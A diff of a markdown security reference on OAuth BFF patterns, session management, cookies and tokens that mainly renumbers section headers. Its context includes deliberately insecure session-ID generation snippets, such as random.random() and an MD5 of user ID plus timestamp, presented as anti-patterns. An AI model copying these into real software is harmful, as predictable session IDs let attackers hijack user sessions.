 The frontend communicates with the BFF exclusively via `HttpOnly`, `Secure`, `SameSite` cookies. The BFF maintains a server-side session store that maps session identifiers to token sets:
 
@@ -39591,7 +39593,7 @@ flowchart LR
     style MicroB text-align:left
 ```
 
-##### 34.2.3 BFF Sequence Diagram
+##### 35.2.3 BFF Sequence Diagram
 
 ```mermaid
 ---
@@ -39915,7 +39917,7 @@ Content-Type: application/json
 #### 35.3 draft-ietf-oauth-browser-based-apps: Current Best Practices
 The IETF draft **"OAuth 2.0 for Browser-Based Applications"** (`draft-ietf-oauth-browser-based-apps-26`, December 2025 — in RFC Editor Queue) codifies security best practices for OAuth flows in browser-based applications. This section summarises the draft's key recommendations.
 
-##### 34.3.1 Recommended Architecture
+##### 35.3.1 Recommended Architecture
 
 The draft identifies three architectural patterns for browser-based applications and provides clear guidance on which to prefer:
 
@@ -39923,7 +39925,7 @@ The draft identifies three architectural patterns for browser-based applications
 2. **Service Worker pattern** — The SPA uses a Service Worker to handle the OAuth flow and store tokens in the Service Worker's context, which is isolated from the main page's JavaScript. This provides some XSS isolation but is still weaker than a server-side backend because the Service Worker runs in the browser
 3. **Direct SPA pattern** — The SPA acts as the OAuth client directly. Tokens are stored in the browser. This is the weakest pattern but may be necessary for pure static SPAs hosted on CDNs without any backend infrastructure
 
-##### 34.3.2 Requirements for Direct SPA Flows (No Backend)
+##### 35.3.2 Requirements for Direct SPA Flows (No Backend)
 
 When a BFF is not feasible and the SPA must handle tokens directly, the draft mandates the following security measures:
 
@@ -39934,7 +39936,7 @@ When a BFF is not feasible and the SPA must handle tokens directly, the draft ma
 - **Token storage** — Access tokens should be stored in JavaScript memory (a variable — not `localStorage` or `sessionStorage`). If `localStorage` must be used (e.g., to survive page reloads), the application must implement robust XSS prevention — Content Security Policy (CSP) with strict nonce-based script-src, Subresource Integrity (SRI) for all third-party scripts, and regular dependency auditing
 - **No cross-origin token requests** — SPAs should not make direct cross-origin requests to the token endpoint. The CORS complexity and token exposure risk are significant. If the authorization server and the SPA are on different origins, a BFF or proxy should mediate the token exchange
 
-##### 34.3.3 Deprecated Patterns
+##### 35.3.3 Deprecated Patterns
 
 The draft explicitly deprecates the following patterns:
 
@@ -39944,7 +39946,7 @@ The draft explicitly deprecates the following patterns:
 | **Resource Owner Password Credentials** (ROPC) | ❌ MUST NOT be used | The client sees the user's password — violates the principle of credential isolation. Enables credential phishing by malicious clients |
 | **Cross-origin token requests from SPAs** | ⚠️ Discouraged | CORS complexity; token exposure in browser. If the AS and SPA are on different origins, use a BFF |
 
-##### 34.3.4 Comparison: BFF vs. SPA-Direct vs. Implicit (Deprecated)
+##### 35.3.4 Comparison: BFF vs. SPA-Direct vs. Implicit (Deprecated)
 
 | Dimension | BFF Pattern | SPA-Direct (PKCE) | Implicit (Deprecated) |
 |:----------|:-----------|:------------------|:---------------------|
@@ -39957,7 +39959,7 @@ The draft explicitly deprecates the following patterns:
 | **IETF recommendation** | ✅ Strongly recommended | ⚠️ Acceptable with mitigations when BFF not feasible | ❌ MUST NOT be used |
 
 #### 35.4 Token Handler Pattern
-##### 34.4.1 Architecture
+##### 35.4.1 Architecture
 
 The Token Handler pattern — pioneered by Curity — is a specialised implementation of the BFF concept optimised for API-first architectures. Where a full BFF contains application-specific business logic (it is the SPA's bespoke backend), the Token Handler is a **generic, reusable OAuth session manager** that handles only the OAuth ceremony — login, token storage, token refresh, logout — and nothing else.
 
@@ -40021,7 +40023,7 @@ window.addEventListener('message', (event) => \{
 >
 > The `targetOrigin` parameter in `postMessage` must be the SPA's explicit origin, never `'*'`; the SPA must validate `event.origin` against the expected token handler origin; the message payload must include a type discriminator to prevent confusion with other `postMessage` events.
 
-##### 34.4.2 Phantom Token Pattern
+##### 35.4.2 Phantom Token Pattern
 
 The phantom token pattern (Curity) extends the Token Handler architecture with a privacy-preserving token translation layer:
 
@@ -40051,7 +40053,7 @@ The phantom token pattern (Curity) extends the Token Handler architecture with a
 **Advantages of the Phantom Token pattern:** (1) clients never see JWTs — only short, opaque identifiers are exposed on the wire; (2) resource servers validate JWTs statelessly (no introspection calls from the RS); (3) revocation is immediate (revoke the opaque token at the AS — no TTL wait); (4) the JWT payload can include internal claims not intended for client visibility (e.g., internal service identifiers, role mappings); (5) token size between client and gateway is minimal (opaque identifier vs full JWT). This pattern is recommended for architectures with an existing API gateway (Kong, Apigee, AWS API Gateway, Envoy) and multiple downstream resource servers.
 
 #### 35.5 Credential Manager Integration
-##### 34.5.1 Web Credential Management API
+##### 35.5.1 Web Credential Management API
 
 The Web Credential Management API (`navigator.credentials`) is the browser's built-in interface for managing user credentials. It provides a unified surface for three credential types:
 
@@ -40063,7 +40065,7 @@ The Web Credential Management API (`navigator.credentials`) is the browser's bui
 
 The Credential Manager is relevant to OAuth proxy and BFF architectures because it changes how the browser mediates the initial authentication step — the user's interaction with the identity provider.
 
-##### 34.5.2 FedCM: Federated Credential Management API
+##### 35.5.2 FedCM: Federated Credential Management API
 
 FedCM is a browser-native API that enables federated login (OIDC, OAuth) **without third-party cookies**. As browsers deprecate third-party cookies (Safari since 2020, Firefox since 2023, Chrome Privacy Sandbox timeline ongoing), traditional OIDC flows that rely on the IdP's third-party cookie for silent re-authentication and session checking break.
 
@@ -40135,7 +40137,7 @@ As of early 2026, FedCM is production-ready in Chromium-based browsers (approxim
 
 > **Editorial Note:** **Cross-chapter references.** See §22 (Attack Vectors) for the full XSS impact analysis across OAuth architectures — including the formal HttpOnly cookie value model ($V_{\text{no-HttpOnly}} = V_{\text{session}} + V_{\text{persistence}} + V_{\text{stealth}}$) — and CSRF protection in OAuth contexts (OAuth state parameter, double-submit cookie pattern, per-architecture defense comparison).
 
-##### 34.5.3 Passkey and FedCM Convergence
+##### 35.5.3 Passkey and FedCM Convergence
 
 The Credential Manager API surfaces both FedCM credentials and passkey credentials (§14) through the same `navigator.credentials.get()` interface. A BFF architecture can combine both:
 
@@ -40166,7 +40168,7 @@ The common principle across all server-side patterns: **the browser possesses on
 **Combined architecture patterns.** In practice, many production deployments layer multiple patterns: the user authenticates via FedCM (or traditional OAuth redirect as fallback), the BFF manages the session and relays tokens to backend APIs, an OAuth proxy at the ingress layer provides an additional authentication boundary for internal services, and a token handler enables direct access to third-party APIs from the SPA when needed. See §35.8 for the architecture selection guide with use-case recommendations.
 
 #### 35.7 Production Deployment Patterns
-##### 34.7.1 Kubernetes Deployment with oauth2-proxy and nginx
+##### 35.7.1 Kubernetes Deployment with oauth2-proxy and nginx
 
 The most common production deployment for OAuth proxy uses a Kubernetes ingress controller with nginx `auth_request` to delegate authentication to oauth2-proxy. This provides authentication at the ingress level, protecting all services behind the ingress without requiring individual service changes.
 
@@ -40295,7 +40297,7 @@ spec:
           periodSeconds: 5
 ```
 
-##### 34.7.2 Redis Session Store Configuration
+##### 35.7.2 Redis Session Store Configuration
 
 For production Kubernetes deployments, Redis provides the session store for oauth2-proxy. Each session entry consumes approximately 1–2 KB. For 100,000 concurrent sessions, allocate approximately 200 MB of Redis memory with headroom for fragmentation:
 
@@ -40338,7 +40340,7 @@ spec:
       claimName: redis-pvc
 ```
 
-##### 34.7.3 Cloud API Gateway Integration
+##### 35.7.3 Cloud API Gateway Integration
 
 Cloud-native API gateways provide built-in OAuth token validation and injection, reducing the need for a separate OAuth proxy component.
 
@@ -40403,7 +40405,7 @@ spec:
       port: 8080
 ```
 
-##### 34.7.4 SPA Framework Integration
+##### 35.7.4 SPA Framework Integration
 
 **React with BFF pattern** — A React SPA communicating with a same-origin BFF requires minimal authentication code. The session cookie is managed entirely by the browser, and the BFF handles all OAuth flows:
 
@@ -40542,7 +40544,7 @@ Every subsequent topic in the Session Management group builds on these fundament
 #### 36.1 Session Lifecycle: Creation, Validation, Renewal, Termination
 A session progresses through four distinct phases. Understanding each phase — and the security invariants that must hold during transitions between them — is essential for building a session management system that resists hijacking, fixation, and replay attacks.
 
-##### 35.1.1 Session Creation
+##### 36.1.1 Session Creation
 
 Session creation occurs immediately after successful authentication. The server performs the following operations atomically:
 
@@ -40591,7 +40593,7 @@ The session identifier is the client's proof of prior authentication. From this 
 
 **Critical invariant:** The session ID must be generated *after* authentication succeeds, not before. Pre-authentication session IDs are the root cause of session fixation attacks (§36.3).
 
-##### 35.1.2 Session Validation
+##### 36.1.2 Session Validation
 
 For every subsequent request, the server validates the session before processing the request:
 
@@ -40647,7 +40649,7 @@ flowchart LR
     style Deny text-align:left
 ```
 
-##### 35.1.3 Session Renewal and Re-Authentication
+##### 36.1.3 Session Renewal and Re-Authentication
 
 Some events require the session to be refreshed or the user to re-authenticate without destroying the existing session:
 
@@ -40670,7 +40672,7 @@ The following table consolidates recommended timeout defaults by application typ
 | Admin consoles | 5 min | 30 min | High-privilege surfaces — short sessions limit the damage window |
 | IoT device management | 10 min | 1 hour | Infrastructure control plane; devices typically authenticate per-session |
 
-##### 35.1.4 Session Termination
+##### 36.1.4 Session Termination
 
 Sessions end through one of five mechanisms:
 
@@ -40687,7 +40689,7 @@ Sessions end through one of five mechanisms:
 - **Federation-wide session termination cascade** — in federated environments (OIDC/SAML), session revocation must propagate across all relying parties. When the IdP terminates a session, two complementary mechanisms coordinate cross-RP revocation: CAEP (Continuous Access Evaluation Protocol) pushes session-level security events (session-revoked, credential-change) to resource servers in near real-time (&lt; 1 second), while RISC (Risk and Incident Sharing and Coordination) pushes account-level events (identifier-recycled, account-disabled) to third-party applications with relaxed latency requirements. CAEP events are scoped to the current session and use pseudonymous subject identifiers (`iss_sub`, `opaque`) to preserve user privacy; RISC events are scoped to the account lifecycle and use directly identifying subject identifiers (`email`, `phone_number`) to enable cross-platform correlation. The session termination cascade is: IdP detects security event → emits CAEP/RISC SETs to all registered receivers → each RP invalidates the affected session(s) → user must re-authenticate at each RP independently. The RISC `identifier-recycled` event is particularly important: when a user deletes their account and the IdP reassigns the identifier to a new user, RPs must be notified to purge data associated with the old user before the new user accesses it — this flow is mandated by GDPR Article 17 (right to erasure). Full CAEP and RISC analysis is in §41.1–§41.3
 - **All-session logout** — the user or administrator terminates all active sessions across all devices. This is the "nuclear option" for suspected account compromise — it invalidates every session associated with the user's account, forcing re-authentication on every device. An alternative implementation uses a per-user **session generation counter** — incrementing the counter invalidates all sessions whose generation number is lower, without requiring enumeration of individual session keys
 
-##### 35.1.5 Session Concurrency Control
+##### 36.1.5 Session Concurrency Control
 
 Some applications restrict the number of concurrent sessions per user. This prevents scenarios where compromised credentials are used to establish parallel sessions while the legitimate user remains logged in:
 
@@ -40696,7 +40698,7 @@ Some applications restrict the number of concurrent sessions per user. This prev
 - **Maximum concurrent sessions** — a configurable cap (e.g., 5 sessions). New session creation beyond the cap either fails (forcing the user to explicitly terminate an existing session) or evicts the oldest session. When eviction is used, prefer **least-recently-activity (LRA) eviction** over FIFO — evict the session with the oldest `last_activity` timestamp, which preserves the user's most active sessions. When evicting a session, notify the affected client where infrastructure supports it (WebSocket, Server-Sent Events, or long-polling) so the user receives immediate feedback rather than discovering the eviction on their next request. Most applications rely on lazy discovery
 - **Concurrent session monitoring** — rather than enforcing limits, the application displays all active sessions to the user ("You are logged in on 3 devices") and allows the user to terminate individual sessions. GitHub, Google, and Microsoft all provide this transparency
 
-##### 35.1.6 Session Lifecycle State Diagram
+##### 36.1.6 Session Lifecycle State Diagram
 
 ```mermaid
 ---
@@ -40728,7 +40730,7 @@ stateDiagram-v2
 #### 36.2 Session Storage: Server-Side vs. Client-Side
 The session identifier is what the client holds. But the *session state* — user identity, AAL, permissions, expiry metadata — must be stored somewhere. The choice of storage architecture has profound implications for revocability, scalability, security, and operational complexity.
 
-##### 35.2.1 Server-Side Session Storage
+##### 36.2.1 Server-Side Session Storage
 
 In server-side session storage, the definitive session state lives on the server. The client holds only an opaque session identifier — a random string in a cookie — that acts as a lookup key into the server's session store. The session ID itself carries no semantic meaning; all security-relevant state is retrieved from the server on each request.
 
@@ -40764,7 +40766,7 @@ Redis is the dominant choice for session storage due to its native TTL support, 
 - **Replay risk** — an attacker who captures an encrypted cookie can replay it until the embedded expiry time passes. Binding the cookie to additional client properties (§36.3) mitigates this partially
 - **Key rotation complexity** — the encryption key must be rotated periodically. During rotation, the server must decrypt cookies encrypted with both the old and new keys simultaneously — typically via a key-version prefix in the cookie value. Dual-key decryption continues until all sessions issued under the old key have naturally expired
 
-##### 35.2.2 Client-Side Session Storage (JWTs)
+##### 36.2.2 Client-Side Session Storage (JWTs)
 
 In client-side session storage, the entire session state is encoded in a signed JWT stored on the client — either in a cookie or in the `Authorization: Bearer` header. The server validates the JWT's signature and claims on each request; no server-side lookup is required.
 
@@ -40775,7 +40777,7 @@ In client-side session storage, the entire session state is encoded in a signed 
 
 The full JWT-as-session-token tradeoff analysis — including the "JWT is not a session" argument and the short-lived access token + refresh token pattern that addresses the revocation gap — is covered in §37.3.
 
-##### 35.2.3 Session Storage Comparison
+##### 36.2.3 Session Storage Comparison
 
 | Dimension | Server-Side (Redis) | Encrypted Cookie | Client-Side (JWT) |
 |:----------|:-------------------|:-----------------|:------------------|
@@ -40832,7 +40834,7 @@ The session identifier is the single credential that represents the user's authe
 
 This section covers the entropy requirements, fixation defences, and binding mechanisms that protect against all three attack categories.
 
-##### 35.3.1 Session ID Entropy and Naming Requirements
+##### 36.3.1 Session ID Entropy and Naming Requirements
 
 **Session ID naming:** The default session cookie names used by major frameworks — `PHPSESSID` (PHP), `JSESSIONID` (Java), `ASP.NET_SessionId` (.NET), `connect.sid` (Express.js) — reveal the underlying technology stack through fingerprinting. OWASP recommends changing the default session cookie name to a generic, non-descriptive value (e.g., `id` or `__Host-sid`) to avoid disclosing implementation details. The `__Host-` prefix (§37.1) further restricts the cookie to the exact origin, preventing domain-scoping attacks.
 
@@ -40884,7 +40886,7 @@ where $H$ is the entropy in bits and $N$ is the number of active sessions. The f
 | `random.random()` (Python) | Platform-dependent | Uses Mersenne Twister internally; not CSPRNG | `session_id = str(random.random())` |
 | User ID + timestamp hash | ~32 bits | Small, predictable input space; an attacker who knows the user ID can enumerate timestamps | `session_id = md5(user_id + timestamp)` |
 
-##### 35.3.1.1 Session Cookie Attributes
+##### 36.3.1.1 Session Cookie Attributes
 
 The cookie that carries the session ID must use secure attributes to prevent interception and misuse. Full cookie attribute semantics and browser behaviour are covered in §37.1; the key attributes for session cookies are summarised here:
 
@@ -40900,7 +40902,7 @@ The cookie that carries the session ID must use secure attributes to prevent int
 
 ⚠️ **Subdomain session theft**: If a vulnerable subdomain (e.g., `staging.example.com`) is compromised and the session cookie has `Domain=.example.com`, an attacker on that subdomain can capture the session cookie and use it against `app.example.com`. The `__Host-` prefix eliminates this vector by disallowing the `Domain` attribute entirely.
 
-##### 35.3.2 Session Fixation
+##### 36.3.2 Session Fixation
 
 Session fixation is an attack where the attacker sets the victim's session ID *before* the victim authenticates. The attack proceeds as follows:
 
@@ -41078,7 +41080,7 @@ Content-Length: 0
 
 </details>
 
-##### 35.3.2.1 WebAuthn Session Management Anti-Patterns
+##### 36.3.2.1 WebAuthn Session Management Anti-Patterns
 
 WebAuthn (§14) is an authentication protocol, not a session protocol — the relying party must implement session management separately and bind the WebAuthn assertion to the session context. The following anti-patterns are specific to WebAuthn-integrated session flows:
 
@@ -41091,7 +41093,7 @@ WebAuthn (§14) is an authentication protocol, not a session protocol — the re
 
 The critical session management requirement for WebAuthn is the **challenge lifecycle**. During both registration and authentication ceremonies, the RP generates a random challenge, stores it server-side with a TTL, and validates the returned response against the stored challenge before issuing any session token. The challenge store should be an ephemeral key-value store (Redis `SETEX` with a 300-second TTL) to ensure automatic cleanup of stale challenges.
 
-##### 35.3.3 Session Binding Mechanisms
+##### 36.3.3 Session Binding Mechanisms
 
 Session binding ties the session to additional client properties beyond the session ID itself. If an attacker steals the session ID (via XSS, network interception, or info-stealer malware — §22.6), binding mechanisms can detect that the session is being used from a different context and block the hijacked request.
 
@@ -41133,7 +41135,7 @@ The critical property: even if the session cookie or access token is stolen, the
 
 DPoP avoids all five limitations: no PKI infrastructure (self-generated key pairs), instant rotation (new key → new token), per-request binding (each request carries a fresh proof), CDN-transparent (proof is in the `Authorization` header, not the TLS layer), and native browser support via the Web Crypto API.
 
-##### 35.3.4 Session Binding Mechanism Comparison
+##### 36.3.4 Session Binding Mechanism Comparison
 
 | Mechanism | Specification | Security Strength | False Positive Rate | Practical Deployment | Defeats Cookie Theft |
 |:----------|:-------------|:-----------------|:-------------------|:--------------------|:-------------------|
@@ -41162,7 +41164,7 @@ The session binding hierarchy — from no binding (pure bearer cookies) through 
 
 For high-security applications, multiple binding mechanisms can be **layered** — DBSC for browser sessions, mTLS for API-to-API communication, and IP address logging as a soft anomaly detection signal without hard enforcement. This defence-in-depth approach ensures that a failure in one binding mechanism does not completely compromise session security.
 
-##### 35.3.5 Privacy-Preserving Multi-Factor Authentication
+##### 36.3.5 Privacy-Preserving Multi-Factor Authentication
 
 Zero-knowledge proofs (§32) can enhance MFA session establishment by enabling authentication without revealing the underlying credential values. Three ZKP-based MFA patterns are applicable to session management:
 
@@ -41174,7 +41176,7 @@ Zero-knowledge proofs (§32) can enhance MFA session establishment by enabling a
 
 These patterns are relevant to session management because they determine what information the server learns during the authentication event that establishes the session. A session established via ZKP-based MFA carries no exploitable credential material — even if the session store is compromised, the attacker cannot extract password hashes, biometric templates, or hardware token identifiers from the session record.
 
-##### 35.3.6 MFA Strategy by Organisation Profile
+##### 36.3.6 MFA Strategy by Organisation Profile
 
 Session management policies — including timeout values, binding requirements, and step-up authentication thresholds — are shaped by the organisation's threat model and regulatory environment. The following scenarios illustrate how MFA form factor selection influences session architecture decisions:
 
@@ -41187,7 +41189,7 @@ Session management policies — including timeout values, binding requirements, 
 
 The enterprise scenario demonstrates the most architecturally complex session policy: layered MFA maps to layered binding — FIDO2 hardware keys for admins enforce DPoP or mTLS binding with short session lifetimes, while synced passkeys for the general workforce allow DPoP binding with more relaxed timeouts. The government scenario mandates the strictest session controls due to regulatory requirements (NIST SP 800-63B, OMB M-22-09), while the healthcare scenario requires the most nuanced role-based approach to balance clinical workflow efficiency with security.
 
-##### 35.3.7 OTP in Session Architecture: Zero Trust Alignment and FIDO2 Coexistence
+##### 36.3.7 OTP in Session Architecture: Zero Trust Alignment and FIDO2 Coexistence
 
 **HOTP in Zero Trust architectures.** In Zero Trust Network Access (ZTNA) deployments, event-based OTP (HOTP — §11) plays a limited but valid role. The core ZTNA principles (verify explicitly, least privilege access, assume breach, continuous verification) create both alignment opportunities and gaps when HOTP is the authentication factor:
 
@@ -41214,7 +41216,7 @@ HOTP and FIDO2/WebAuthn operate at different protocol layers and cannot share cr
 #### 36.4 Session Security Invariants
 The session lifecycle phases covered in §36.1 impose security invariants — properties that must hold at every stage of the session's existence. Violating any invariant creates a exploitable vulnerability. These invariants form a design contract for session management implementations and serve as an audit checklist for security assessors. The 13 invariants below are organised by lifecycle phase: creation (INV-C), validation (INV-V), renewal (INV-R), and termination (INV-T).
 
-##### 35.4.1 Creation Invariants
+##### 36.4.1 Creation Invariants
 
 **INV-C1 (Atomicity).** Session creation is atomic — the session ID generation, session record persistence, and session ID delivery to the client succeed or fail as a unit. If the session record cannot be persisted (e.g., Redis write failure), no session ID is issued. A non-persisted session ID creates an orphan state where the client believes it is authenticated but the server has no record.
 
@@ -41224,7 +41226,7 @@ The session lifecycle phases covered in §36.1 impose security invariants — pr
 
 **INV-C4 (Cookie security).** The session cookie is set with `Secure`, `HttpOnly`, and `SameSite=Strict` (or `Lax`). The cookie name uses the `__Host-` prefix. No `Domain` attribute is set. Detailed rationale is in §36.3.1.1 and §37.1.
 
-##### 35.4.2 Validation Invariants
+##### 36.4.2 Validation Invariants
 
 **INV-V1 (Existence before use).** Every session ID is validated against the session store before access is granted. An unrecognised session ID is always rejected with `401 Unauthorized` — it is never auto-created. This prevents attackers from injecting arbitrary session IDs.
 
@@ -41234,7 +41236,7 @@ The session lifecycle phases covered in §36.1 impose security invariants — pr
 
 **INV-V4 (Revocation immediate).** If `is_revoked` is set on a session, the session is rejected immediately, regardless of other validity checks. Revocation takes precedence over all other validation steps — an expired, revoked session is rejected for revocation, not expiry.
 
-##### 35.4.3 Renewal Invariants
+##### 36.4.3 Renewal Invariants
 
 **INV-R1 (Generation counter monotonicity).** The generation counter (§36.1.2, check 7) is strictly monotonically increasing. It is never decremented or reset to a lower value during a session's lifetime. This guarantees that a client observing a generation mismatch can conclusively determine that session state has changed.
 
@@ -41242,7 +41244,7 @@ The session lifecycle phases covered in §36.1 impose security invariants — pr
 
 **INV-R3 (AAL elevation only).** The AAL value in a session can only increase or remain constant during its lifetime. It must never decrease. If AAL must be downgraded (e.g., a hardware authenticator is unenrolled), the session must be terminated and a new session created at the lower AAL.
 
-##### 35.4.4 Termination Invariants
+##### 36.4.4 Termination Invariants
 
 **INV-T1 (Cookie cleared).** On explicit logout, the server instructs the client to delete the session cookie by sending `Set-Cookie` with an empty value and `Max-Age=0` (or a past `Expires`). The server must not rely on the client to "forget" the cookie — it must actively instruct deletion.
 
@@ -41274,11 +41276,11 @@ Production architectures layer multiple token types, each serving a distinct rol
 | Device binding | DPoP / mTLS proof | Sender constraint on access token | Matches access token | Browser / device keystore |
 
 #### 37.1 HTTP Cookies (Session Cookies, Secure Flags, SameSite, __Host- Prefix)
-##### 36.1.1 Cookies as Session Transport
+##### 37.1.1 Cookies as Session Transport
 
 HTTP is a stateless protocol — each request is independent, carrying no inherent memory of previous interactions. Cookies (RFC 6265, updated by RFC 6265bis) are the original and still dominant mechanism for imposing session state onto HTTP. The server sets a cookie via the `Set-Cookie` response header; the browser automatically includes the cookie in subsequent requests to the same origin via the `Cookie` request header. This automatic inclusion — without any JavaScript intervention — is both the cookie's greatest strength (transparent session continuity) and its greatest security challenge (the browser sends cookies even on attacker-initiated cross-origin requests, enabling CSRF).
 
-##### 36.1.2 Session Cookies vs. Persistent Cookies
+##### 37.1.2 Session Cookies vs. Persistent Cookies
 
 Cookies are categorised by their lifetime:
 
@@ -41297,7 +41299,7 @@ Cookies are categorised by their lifetime:
 
 A "remember me" feature should use a **separate** persistent cookie (with a refresh token or dedicated long-lived opaque token), while the primary session cookie should remain session-scoped.
 
-##### 36.1.3 Cookie Security Attributes
+##### 37.1.3 Cookie Security Attributes
 
 Every session cookie must be configured with the full set of security attributes. Omitting any attribute creates a specific attack surface:
 
@@ -41331,7 +41333,7 @@ Even with `Lax`, cookies are attached to top-level GET navigations (e.g., clicki
 
 **`Path`** — restricts the cookie to requests matching the specified path prefix. Rarely useful for session cookies, which should apply site-wide (`Path=/`). Setting a narrower path (e.g., `Path=/admin`) limits the cookie to requests under that path, but `Path` is not a security boundary — JavaScript on `example.com/public` can still send requests to `example.com/admin` via `fetch()`, and the browser will include the cookie if the path matches.
 
-##### 36.1.4 Cookie Prefixes
+##### 37.1.4 Cookie Prefixes
 
 Cookie prefixes are browser-enforced naming conventions that impose security constraints on cookies based on their name. Unlike cookie attributes (which the server sets and the browser honours), cookie prefixes are enforced by the browser at the time the cookie is *set* — if the cookie does not meet the prefix's requirements, the browser rejects it entirely.
 
@@ -41346,7 +41348,7 @@ The `__Host-` prefix prevents a critical attack vector: **subdomain cookie injec
 
 **`__Secure-` prefix** — a less restrictive prefix that requires only the `Secure` flag and an HTTPS origin. Unlike `__Host-`, a `__Secure-` cookie may include a `Domain` attribute. Use `__Secure-` only when subdomain sharing is an architectural requirement — prefer `__Host-` for all session cookies.
 
-##### 36.1.5 Recommended Session Cookie Configuration
+##### 37.1.5 Recommended Session Cookie Configuration
 
 The following configuration represents the security-optimised session cookie for a standard web application:
 
@@ -41381,7 +41383,7 @@ The following table provides opinionated settings for common cookie roles beyond
 
 The cross-service SSO cookie uses `__Secure-` instead of `__Host-` because it requires a `Domain` attribute for cross-subdomain sharing — `__Host-` prohibits `Domain`. The `__Secure-` prefix still enforces HTTPS-only transmission.
 
-##### 36.1.6 Cookie Size and Count Limits
+##### 37.1.6 Cookie Size and Count Limits
 
 Browsers enforce per-domain limits on cookie storage — these limits are implementation-specific but converge around:
 
@@ -41392,7 +41394,7 @@ Browsers enforce per-domain limits on cookie storage — these limits are implem
 Session cookies should be small — an opaque session identifier (32–64 characters) is well within limits. Embedding JWTs in cookies approaches the 4 KB per-cookie limit: a typical JWT access token with standard claims occupies 800–1,500 bytes; adding user-specific claims (groups, roles, permissions) can push the JWT past 2 KB. Exceeding the limit causes silent truncation or rejection — the browser drops the cookie without error, breaking the session.
 
 #### 37.2 Opaque/Reference Tokens
-##### 36.2.1 Token Structure and Generation
+##### 37.2.1 Token Structure and Generation
 
 An opaque token (also called a **reference token**) is a random string — typically 128–256 bits of entropy generated by a CSPRNG — that serves as a lookup key for server-side state. The token itself carries no semantically meaningful information: it is not a JWT, contains no claims, and cannot be decoded or parsed by the client or any intermediary. From the perspective of anyone who intercepts the token, it is an indistinguishable random string:
 
@@ -41402,7 +41404,7 @@ dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk
 
 The authorization server maintains a mapping between the opaque token string and the associated session metadata (user identity, scopes, expiry, client identity) in a server-side store — typically Redis, a relational database, or an in-memory cache.
 
-##### 36.2.2 Token Introspection (RFC 7662)
+##### 37.2.2 Token Introspection (RFC 7662)
 
 When a resource server receives an opaque token, it cannot validate the token locally — the token contains no information to validate. Instead, the resource server calls the authorization server's **introspection endpoint** (RFC 7662) to validate the token and retrieve its associated metadata:
 
@@ -41584,7 +41586,7 @@ Content-Type: application/json
 
 </details>
 
-##### 36.2.3 Token Revocation (RFC 7009)
+##### 37.2.3 Token Revocation (RFC 7009)
 
 Opaque tokens support **instant revocation**: the authorization server deletes or marks the token as inactive in the server-side store. The next introspection call returns `"active": false`, and the token is immediately unusable. This is the defining advantage of opaque tokens over JWTs (§37.3).
 
@@ -41602,7 +41604,7 @@ token=dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk
 
 The authorization server always returns HTTP 200, regardless of whether the token existed or was already revoked — this prevents token enumeration attacks.
 
-##### 36.2.4 Advantages and Disadvantages
+##### 37.2.4 Advantages and Disadvantages
 
 | Dimension | Assessment |
 |:----------|:-----------|
@@ -41615,7 +41617,7 @@ The authorization server always returns HTTP 200, regardless of whether the toke
 | **Audit trail** | ✅ Server-side store can log every token issuance and validation — full visibility into session activity |
 | **Self-contained** | ❌ A downstream service that receives the token cannot validate it without contacting the issuer — requires network access to the introspection endpoint |
 
-##### 36.2.5 When to Use Opaque Tokens
+##### 37.2.5 When to Use Opaque Tokens
 
 Opaque tokens are preferred when:
 
@@ -41624,7 +41626,7 @@ Opaque tokens are preferred when:
 - **The Phantom Token pattern is in use** — the API gateway receives an opaque token from the client, introspects it, and replaces it with a JWT for downstream microservices (§35.4). The client never sees the JWT, and the opaque token provides the public-facing revocability guarantee
 
 #### 37.3 JWTs as Session Tokens: Tradeoffs and Anti-Patterns
-##### 36.3.1 JWT Structure (RFC 7519)
+##### 37.3.1 JWT Structure (RFC 7519)
 
 A JSON Web Token (JWT — RFC 7519) is a self-contained, signed token consisting of three base64url-encoded segments separated by dots: `Header.Payload.Signature`. The token carries its own claims and can be validated without contacting the issuing authorization server.
 
@@ -41668,7 +41670,7 @@ RSA-SHA256(
 
 The resource server validates the signature using the authorization server's public key, obtained via the authorization server's JWKS (JSON Web Key Set) endpoint — typically published at `/.well-known/jwks.json`. If the signature is valid, the resource server trusts the claims without contacting the authorization server — this is the stateless validation property that defines JWTs.
 
-##### 36.3.2 JWT Profile for OAuth Access Tokens (RFC 9068)
+##### 37.3.2 JWT Profile for OAuth Access Tokens (RFC 9068)
 
 RFC 9068 standardises the structure of JWT-formatted OAuth access tokens, defining required claims and header parameters that enable interoperability across authorization servers and resource servers:
 
@@ -41770,7 +41772,7 @@ flowchart LR
     style Deny text-align:left
 ```
 
-##### 36.3.3 Advantages of JWT Access Tokens
+##### 37.3.3 Advantages of JWT Access Tokens
 
 **Stateless validation** — the resource server validates the JWT by verifying the signature against the authorization server's public key (cached locally from the JWKS endpoint), checking the `exp`, `iat`, `iss`, `aud`, and `nbf` claims, and confirming the `scope` or other authorisation claims match the requested operation. No network call to the authorization server is needed. This eliminates the introspection bottleneck that limits opaque tokens (§37.2.4) and enables horizontal scaling — any resource server instance with the public key can validate any token independently.
 
@@ -41778,7 +41780,7 @@ flowchart LR
 
 **Cross-service portability** — the same JWT can be validated by multiple resource servers (all sharing trust in the issuing authorization server's JWKS). In a microservices architecture, the frontend BFF obtains a JWT from the authorization server, and the JWT is accepted by the orders service, the payments service, and the notifications service — each validating the same signature against the same public key.
 
-##### 36.3.4 The JWT Revocation Problem
+##### 37.3.4 The JWT Revocation Problem
 
 The stateless property that makes JWTs scalable also makes them fundamentally difficult to revoke. A JWT is valid from `iat` to `exp` — there is no server-side state to delete. If a JWT with a 1-hour lifetime is compromised at minute 1, the attacker has 59 minutes of valid access. This is the critical tradeoff of JWT-based session management.
 
@@ -41824,7 +41826,7 @@ The revocation strategy should be matched to the credential lifetime:
 
 **Extended token lifetimes with CAEP.** The CAEP guarantee that compromised tokens will be revoked in near-real-time enables a counterintuitive design: access tokens with significantly extended lifetimes. Microsoft Entra ID Continuous Access Evaluation (CAE) issues access tokens with up to **28-hour lifetimes** (vs the standard 1 hour), reducing token refresh frequency and improving performance. When CAE is enabled, Entra ID adds the `capol` (Continuous Access Policy) claim to access tokens, signalling to resource servers that the token may be revoked at any time via CAEP events. This trades increased token exposure for operational simplicity — the trade-off is catastrophic if CAE fails, because a compromised 28-hour token without CAEP revocation grants the attacker an extended window of access. Microsoft has also introduced **CAE Strict Location Enforcement** (2025), which extends CAEP to enforce Conditional Access location policies in real time — closing the gap where a compromised session could continue from an unapproved location for up to 1 hour.
 
-##### 36.3.5 Anti-Patterns: Common JWT Misuse
